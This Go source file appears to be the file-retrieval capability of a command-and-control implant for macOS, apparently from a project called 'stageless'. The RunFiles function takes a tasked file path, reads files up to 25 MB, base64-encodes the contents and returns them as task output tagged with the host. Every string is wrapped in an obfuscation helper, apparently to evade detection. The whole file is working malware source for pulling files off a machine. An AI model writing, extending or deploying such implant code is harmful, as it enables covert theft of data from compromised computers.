package capabilities

import (
	"encoding/base64"
	"os"
	"strings"

	"stageless/utils/general"
	"stageless/utils/macapi"
	"stageless/utils/obf"
	"stageless/utils/tasks"
)

var FileMaxSize uint64 = 25 * 1024 * 1024

const fileMaxSizeError = "File exceeds the 25 MB limit"

func queryFileByteSize(path string) (ok bool, size uint64, errMsg string) {
	// Reads the byte size of a file path
	st, err := os.Stat(path)
	if err != nil {
		return false, 0, macapi.IOErrorMessage(err)
	}
	if st.IsDir() {
		return false, 0, obf.S("Path is a directory")
	}
	return true, uint64(st.Size()), ""
}

func RunFiles(host, taskTag, input, params string) []byte {
	// Main function that reads a file and sends its content
	inputPath := strings.TrimSpace(input)
	if inputPath == "" || inputPath == macapi.PathSep || inputPath == " " {
		msg := general.MarshalJSON(map[string]any{
			obf.S("option"):      obf.S("output"),
			obf.S("type"):        obf.S("folders"),
			obf.S("host"):        host,
			obf.S("task_tag"):    taskTag,
			obf.S("get_content"): true,
			obf.S("error"):       obf.S("File path is empty"),
		})
		tasks.ApplyTaskOutput(msg, params, taskTag)
		return nil
	}

	sizeOk, fileSize, sizeErr := queryFileByteSize(inputPath)
	if !sizeOk {
		msg := general.MarshalJSON(map[string]any{
			obf.S("option"):      obf.S("output"),
			obf.S("type"):        obf.S("folders"),
			obf.S("host"):        host,
			obf.S("task_tag"):    taskTag,
			obf.S("get_content"): true,
			obf.S("error"):       sizeErr,
		})
		tasks.ApplyTaskOutput(msg, params, taskTag)
		return nil
	}
	if fileSize > FileMaxSize {
		msg := general.MarshalJSON(map[string]any{
			obf.S("option"):      obf.S("output"),
			obf.S("type"):        obf.S("folders"),
			obf.S("host"):        host,
			obf.S("task_tag"):    taskTag,
			obf.S("get_content"): true,
			obf.S("error"):       obf.S(fileMaxSizeError),
		})
		tasks.ApplyTaskOutput(msg, params, taskTag)
		return nil
	}

	ok, data, errMsg := macapi.ReadFileBytes(inputPath)
	if !ok {
		msg := general.MarshalJSON(map[string]any{
			obf.S("option"):      obf.S("output"),
			obf.S("type"):        obf.S("folders"),
			obf.S("host"):        host,
			obf.S("task_tag"):    taskTag,
			obf.S("get_content"): true,
			obf.S("error"):       errMsg,
		})
		tasks.ApplyTaskOutput(msg, params, taskTag)
		return nil
	}
	msg := general.MarshalJSON(map[string]any{
		obf.S("option"):      obf.S("output"),
		obf.S("type"):        obf.S("folders"),
		obf.S("host"):        host,
		obf.S("task_tag"):    taskTag,
		obf.S("get_content"): true,
		obf.S("file_name"):   macapi.BaseName(inputPath),
		obf.S("content"):     base64.StdEncoding.EncodeToString(data),
	})
	tasks.ApplyTaskOutput(msg, params, taskTag)
	return nil
}
